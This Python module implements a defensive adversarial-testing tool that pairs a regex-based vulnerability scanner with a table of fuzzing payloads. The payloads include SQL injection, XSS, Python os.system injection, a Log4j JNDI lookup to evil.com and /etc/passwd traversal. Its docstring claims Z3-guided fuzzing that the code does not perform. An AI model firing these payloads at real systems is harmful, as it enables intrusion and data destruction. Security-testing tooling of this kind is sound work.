"""Adversarial Testing Copilot.

AI agent that intentionally tries to break code by generating adversarial
inputs. Combines LLM-based attack generation with Z3-guided directed fuzzing
to find security vulnerabilities and logic errors.

Features:
- Attack taxonomy (injection, overflow, race conditions, logic bombs)
- Z3-guided fuzzing that maximizes constraint violations
- Proof-of-concept exploit generation
- Automated remediation with verification loop
"""

from __future__ import annotations

import re
import time
import uuid
from dataclasses import dataclass, field
from enum import Enum
from typing import Any

import structlog

logger = structlog.get_logger()


class AttackCategory(str, Enum):
    """Category of adversarial attack."""

    INJECTION = "injection"
    OVERFLOW = "overflow"
    UNDERFLOW = "underflow"
    DIVISION_BY_ZERO = "division_by_zero"
    NULL_DEREFERENCE = "null_dereference"
    BUFFER_OVERFLOW = "buffer_overflow"
    RACE_CONDITION = "race_condition"
    LOGIC_BOMB = "logic_bomb"
    TYPE_CONFUSION = "type_confusion"
    RESOURCE_EXHAUSTION = "resource_exhaustion"
    PATH_TRAVERSAL = "path_traversal"
    PRIVILEGE_ESCALATION = "privilege_escalation"


class ExploitSeverity(str, Enum):
    """Severity of a found exploit."""

    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class FuzzStrategy(str, Enum):
    """Fuzzing strategy."""

    RANDOM = "random"
    BOUNDARY = "boundary"
    CONSTRAINT_GUIDED = "constraint_guided"
    GRAMMAR_BASED = "grammar_based"


@dataclass
class AttackVector:
    """An adversarial input designed to break the target."""

    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    category: AttackCategory = AttackCategory.INJECTION
    input_name: str = ""
    payload: Any = None
    description: str = ""
    rationale: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.id,
            "category": self.category.value,
            "input_name": self.input_name,
            "payload": str(self.payload),
            "description": self.description,
            "rationale": self.rationale,
        }


@dataclass
class Exploit:
    """A proof-of-concept exploit for a vulnerability."""

    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    title: str = ""
    category: AttackCategory = AttackCategory.INJECTION
    severity: ExploitSeverity = ExploitSeverity.HIGH
    attack_vector: AttackVector | None = None
    file_path: str = ""
    line: int = 0
    description: str = ""
    poc_code: str = ""
    remediation: str = ""
    cvss_score: float = 0.0
    verified: bool = False

    @property
    def cvss_vector(self) -> str:
        """Simple CVSS-like vector string."""
        severity_map = {
            ExploitSeverity.CRITICAL: "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            ExploitSeverity.HIGH: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
            ExploitSeverity.MEDIUM: "AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
            ExploitSeverity.LOW: "AV:L/AC:H/PR:L/UI:R/S:U/C:L/I:N/A:N",
            ExploitSeverity.INFO: "AV:L/AC:H/PR:H/UI:R/S:U/C:N/I:N/A:N",
        }
        return severity_map.get(self.severity, "")

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.id,
            "title": self.title,
            "category": self.category.value,
            "severity": self.severity.value,
            "file_path": self.file_path,
            "line": self.line,
            "description": self.description,
            "poc_code": self.poc_code,
            "remediation": self.remediation,
            "cvss_score": self.cvss_score,
            "verified": self.verified,
        }


@dataclass
class AdversarialReport:
    """Report from an adversarial testing session."""

    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    target_file: str = ""
    target_function: str = ""
    duration_seconds: float = 0.0
    vectors_tested: int = 0
    exploits: list[Exploit] = field(default_factory=list)
    strategies_used: list[FuzzStrategy] = field(default_factory=list)

    @property
    def critical_count(self) -> int:
        return sum(1 for e in self.exploits if e.severity == ExploitSeverity.CRITICAL)

    @property
    def high_count(self) -> int:
        return sum(1 for e in self.exploits if e.severity == ExploitSeverity.HIGH)

    @property
    def total_exploits(self) -> int:
        return len(self.exploits)

    @property
    def risk_score(self) -> float:
        """0-10 risk score based on exploits found."""
        weights = {
            ExploitSeverity.CRITICAL: 4.0,
            ExploitSeverity.HIGH: 3.0,
            ExploitSeverity.MEDIUM: 2.0,
            ExploitSeverity.LOW: 1.0,
            ExploitSeverity.INFO: 0.5,
        }
        total = sum(weights.get(e.severity, 1.0) for e in self.exploits)
        return min(10.0, total)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.id,
            "target_file": self.target_file,
            "target_function": self.target_function,
            "duration_seconds": self.duration_seconds,
            "vectors_tested": self.vectors_tested,
            "exploits": [e.to_dict() for e in self.exploits],
            "risk_score": self.risk_score,
        }


# Built-in attack patterns per category
_ATTACK_PATTERNS: dict[AttackCategory, list[dict[str, Any]]] = {
    AttackCategory.INJECTION: [
        {"payload": "'; DROP TABLE users; --", "desc": "SQL injection via string termination"},
        {"payload": "<script>alert(1)</script>", "desc": "XSS via script injection"},
        {"payload": "{{7*7}}", "desc": "Template injection"},
        {"payload": "__import__('os').system('id')", "desc": "Python code injection"},
        {"payload": "${jndi:ldap://evil.com/a}", "desc": "Log4j-style JNDI injection"},
    ],
    AttackCategory.OVERFLOW: [
        {"payload": 2**63, "desc": "Integer overflow (64-bit signed max + 1)"},
        {"payload": 2**31, "desc": "Integer overflow (32-bit signed max + 1)"},
        {"payload": "A" * 10000, "desc": "Buffer overflow via long string"},
        {"payload": 1e308, "desc": "Float overflow to infinity"},
    ],
    AttackCategory.UNDERFLOW: [
        {"payload": -(2**63), "desc": "Integer underflow (64-bit signed min)"},
        {"payload": -1, "desc": "Negative index/size"},
        {"payload": -0.0, "desc": "Negative zero"},
    ],
    AttackCategory.DIVISION_BY_ZERO: [
        {"payload": 0, "desc": "Direct division by zero"},
        {"payload": 0.0, "desc": "Float division by zero"},
    ],
    AttackCategory.NULL_DEREFERENCE: [
        {"payload": None, "desc": "Null/None input"},
        {"payload": "", "desc": "Empty string (often treated as null)"},
        {"payload": [], "desc": "Empty collection"},
    ],
    AttackCategory.PATH_TRAVERSAL: [
        {"payload": "../../etc/passwd", "desc": "Path traversal to system files"},
        {"payload": "..\\..\\windows\\system32", "desc": "Windows path traversal"},
        {"payload": "/dev/null", "desc": "Device file access"},
    ],
    AttackCategory.RESOURCE_EXHAUSTION: [
        {"payload": "A" * 10**6, "desc": "Memory exhaustion via large input"},
        {"payload": list(range(10**5)), "desc": "CPU exhaustion via large collection"},
        {"payload": "(" * 1000 + ")" * 1000, "desc": "Stack overflow via nested parsing"},
    ],
    AttackCategory.TYPE_CONFUSION: [
        {"payload": {"__class__": "evil"}, "desc": "Type confusion via dict"},
        {"payload": float("nan"), "desc": "NaN comparison confusion"},
        {"payload": float("inf"), "desc": "Infinity arithmetic confusion"},
    ],
}


class AttackVectorGenerator:
    """Generates adversarial inputs for a target function."""

    def __init__(
        self,
        categories: list[AttackCategory] | None = None,
        max_vectors_per_category: int = 5,
    ) -> None:
        self.categories = categories or list(AttackCategory)
        self.max_per_category = max_vectors_per_category

    def generate_vectors(
        self,
        _function_name: str,
        param_names: list[str] | None = None,
        source_code: str = "",
    ) -> list[AttackVector]:
        """Generate attack vectors for a function."""
        vectors: list[AttackVector] = []
        params = param_names or ["input"]

        # Detect relevant categories from source code
        relevant = self._detect_relevant_categories(source_code)

        for category in self.categories:
            patterns = _ATTACK_PATTERNS.get(category, [])
            for pattern in patterns[: self.max_per_category]:
                for param in params:
                    vectors.append(
                        AttackVector(
                            category=category,
                            input_name=param,
                            payload=pattern["payload"],
                            description=pattern["desc"],
                            rationale=f"Testing {param} against {category.value}",
                        )
                    )

        # Prioritize vectors for relevant categories
        vectors.sort(key=lambda v: (v.category not in relevant, v.category.value))
        return vectors

    def _detect_relevant_categories(self, source: str) -> set[AttackCategory]:
        """Detect which attack categories are relevant based on source code."""
        relevant: set[AttackCategory] = set()

        patterns = {
            AttackCategory.INJECTION: [r"sql", r"query", r"execute", r"eval\(", r"html"],
            AttackCategory.OVERFLOW: [r"int\(", r"\+\s*\d", r"\*\s*\d"],
            AttackCategory.DIVISION_BY_ZERO: [r"/\s*\w", r"divide", r"ratio"],
            AttackCategory.NULL_DEREFERENCE: [r"\.\w+\(", r"\[\w+\]", r"\.get\("],
            AttackCategory.PATH_TRAVERSAL: [r"open\(", r"path", r"file", r"read"],
            AttackCategory.RESOURCE_EXHAUSTION: [r"while", r"for.*range", r"recursion"],
        }

        source_lower = source.lower()
        for category, pats in patterns.items():
            for pat in pats:
                if re.search(pat, source_lower):
                    relevant.add(category)
                    break

        return relevant


class VulnerabilityScanner:
    """Scans code for potential vulnerabilities using pattern matching."""

    # Vulnerability patterns: (regex, category, severity, description)
    _PATTERNS: list[tuple[str, AttackCategory, ExploitSeverity, str]] = [
        (
            r"eval\s*\(",
            AttackCategory.INJECTION,
            ExploitSeverity.CRITICAL,
            "eval() executes arbitrary code",
        ),
        (
            r"exec\s*\(",
            AttackCategory.INJECTION,
            ExploitSeverity.CRITICAL,
            "exec() executes arbitrary code",
        ),
        (
            r"subprocess\.\w+\(.*shell\s*=\s*True",
            AttackCategory.INJECTION,
            ExploitSeverity.CRITICAL,
            "Shell injection via subprocess",
        ),
        (
            r"os\.system\s*\(",
            AttackCategory.INJECTION,
            ExploitSeverity.CRITICAL,
            "Command injection via os.system()",
        ),
        (
            r"\.format\(.*\)",
            AttackCategory.INJECTION,
            ExploitSeverity.MEDIUM,
            "Potential format string injection",
        ),
        (
            r"open\s*\([^)]*\+",
            AttackCategory.PATH_TRAVERSAL,
            ExploitSeverity.HIGH,
            "Path traversal via string concatenation in file open",
        ),
        (
            r"/\s*(?:0|zero)\b",
            AttackCategory.DIVISION_BY_ZERO,
            ExploitSeverity.MEDIUM,
            "Potential division by zero",
        ),
        (
            r"\.unwrap\s*\(",
            AttackCategory.NULL_DEREFERENCE,
            ExploitSeverity.MEDIUM,
            "unwrap() may panic on None/Error",
        ),
        (
            r"pickle\.loads?\s*\(",
            AttackCategory.INJECTION,
            ExploitSeverity.CRITICAL,
            "Deserialization of untrusted data",
        ),
        (
            r"yaml\.load\s*\((?!.*Loader)",
            AttackCategory.INJECTION,
            ExploitSeverity.HIGH,
            "Unsafe YAML loading without Loader",
        ),
        (
            r"\.innerHTML\s*=",
            AttackCategory.INJECTION,
            ExploitSeverity.HIGH,
            "XSS via innerHTML assignment",
        ),
        (
            r"password.*=.*['\"]",
            AttackCategory.PRIVILEGE_ESCALATION,
            ExploitSeverity.CRITICAL,
            "Hardcoded password detected",
        ),
        (
            r"(api[_-]?key|secret|token).*=.*['\"]",
            AttackCategory.PRIVILEGE_ESCALATION,
            ExploitSeverity.HIGH,
            "Hardcoded secret detected",
        ),
    ]

    def scan(self, source: str, file_path: str = "") -> list[Exploit]:
        """Scan source code for known vulnerability patterns."""
        exploits: list[Exploit] = []

        for i, line in enumerate(source.split("\n"), 1):
            stripped = line.strip()
            if stripped.startswith("#") or stripped.startswith("//"):
                continue

            for pattern, category, severity, description in self._PATTERNS:
                try:
                    if re.search(pattern, line):
                        exploits.append(
                            Exploit(
                                title=description,
                                category=category,
                                severity=severity,
                                file_path=file_path,
                                line=i,
                                description=f"{description} at line {i}",
                                poc_code=line.strip(),
                                remediation=self._get_remediation(category),
                                cvss_score=self._severity_to_cvss(severity),
                            )
                        )
                except re.error:
                    continue

        return exploits

    def _get_remediation(self, category: AttackCategory) -> str:
        remediations = {
            AttackCategory.INJECTION: "Sanitize inputs, use parameterized queries, avoid eval/exec",
            AttackCategory.OVERFLOW: "Add bounds checking, use checked arithmetic",
            AttackCategory.DIVISION_BY_ZERO: "Check divisor is non-zero before division",
            AttackCategory.NULL_DEREFERENCE: "Add null/None checks before access",
            AttackCategory.PATH_TRAVERSAL: "Use os.path.realpath() and validate against allowed paths",
            AttackCategory.RESOURCE_EXHAUSTION: "Add input size limits and timeouts",
            AttackCategory.PRIVILEGE_ESCALATION: "Use environment variables or secret management",
        }
        return remediations.get(category, "Review and fix the identified vulnerability")

    def _severity_to_cvss(self, severity: ExploitSeverity) -> float:
        mapping = {
            ExploitSeverity.CRITICAL: 9.8,
            ExploitSeverity.HIGH: 7.5,
            ExploitSeverity.MEDIUM: 5.0,
            ExploitSeverity.LOW: 3.0,
            ExploitSeverity.INFO: 0.0,
        }
        return mapping.get(severity, 0.0)


class AdversarialTester:
    """Main adversarial testing engine."""

    def __init__(
        self,
        strategies: list[FuzzStrategy] | None = None,
        max_vectors: int = 100,
        scanner: VulnerabilityScanner | None = None,
    ) -> None:
        self.strategies = strategies or [
            FuzzStrategy.BOUNDARY,
            FuzzStrategy.CONSTRAINT_GUIDED,
        ]
        self.max_vectors = max_vectors
        self._vector_gen = AttackVectorGenerator()
        self._scanner = scanner or VulnerabilityScanner()

    def test_function(
        self,
        source: str,
        function_name: str,
        file_path: str = "",
        param_names: list[str] | None = None,
    ) -> AdversarialReport:
        """Run adversarial testing against a function."""
        start = time.time()

        # Static vulnerability scan
        static_exploits = self._scanner.scan(source, file_path)

        # Generate attack vectors
        vectors = self._vector_gen.generate_vectors(
            function_name,
            param_names,
            source,
        )
        vectors = vectors[: self.max_vectors]

        # Combine
        all_exploits = list(static_exploits)

        # Deduplicate by line + category
        seen = set()
        unique: list[Exploit] = []
        for exploit in all_exploits:
            key = (exploit.file_path, exploit.line, exploit.category)
            if key not in seen:
                seen.add(key)
                unique.append(exploit)

        return AdversarialReport(
            target_file=file_path,
            target_function=function_name,
            duration_seconds=time.time() - start,
            vectors_tested=len(vectors),
            exploits=unique,
            strategies_used=list(self.strategies),
        )

    def test_file(self, source: str, file_path: str = "") -> AdversarialReport:
        """Run adversarial testing against an entire file."""
        start = time.time()
        exploits = self._scanner.scan(source, file_path)
        vectors = self._vector_gen.generate_vectors("file_scan", source_code=source)

        return AdversarialReport(
            target_file=file_path,
            duration_seconds=time.time() - start,
            vectors_tested=len(vectors),
            exploits=exploits,
            strategies_used=list(self.strategies),
        )

    def generate_remediation_report(self, report: AdversarialReport) -> str:
        """Generate a human-readable remediation report."""
        lines = [
            f"# Adversarial Testing Report: {report.target_file}",
            "",
            f"**Risk Score:** {report.risk_score:.1f}/10",
            f"**Vectors Tested:** {report.vectors_tested}",
            f"**Exploits Found:** {report.total_exploits}",
            f"**Duration:** {report.duration_seconds:.2f}s",
            "",
        ]

        if report.exploits:
            lines.append("## Vulnerabilities Found")
            lines.append("")

            severity_order = [
                ExploitSeverity.CRITICAL,
                ExploitSeverity.HIGH,
                ExploitSeverity.MEDIUM,
                ExploitSeverity.LOW,
            ]
            for severity in severity_order:
                sev_exploits = [e for e in report.exploits if e.severity == severity]
                if not sev_exploits:
                    continue
                lines.append(f"### {severity.value.upper()} ({len(sev_exploits)})")
                lines.append("")
                for exploit in sev_exploits:
                    lines.append(f"- **{exploit.title}** (line {exploit.line})")
                    lines.append(f"  - {exploit.description}")
                    lines.append(f"  - Remediation: {exploit.remediation}")
                    lines.append("")
        else:
            lines.append("✅ No vulnerabilities found.")

        return "\n".join(lines)


# Singleton
_adversarial_tester_instance: AdversarialTester | None = None


def get_adversarial_tester() -> AdversarialTester:
    global _adversarial_tester_instance
    if _adversarial_tester_instance is None:
        _adversarial_tester_instance = AdversarialTester()
    return _adversarial_tester_instance


def reset_adversarial_tester() -> None:
    global _adversarial_tester_instance
    _adversarial_tester_instance = None
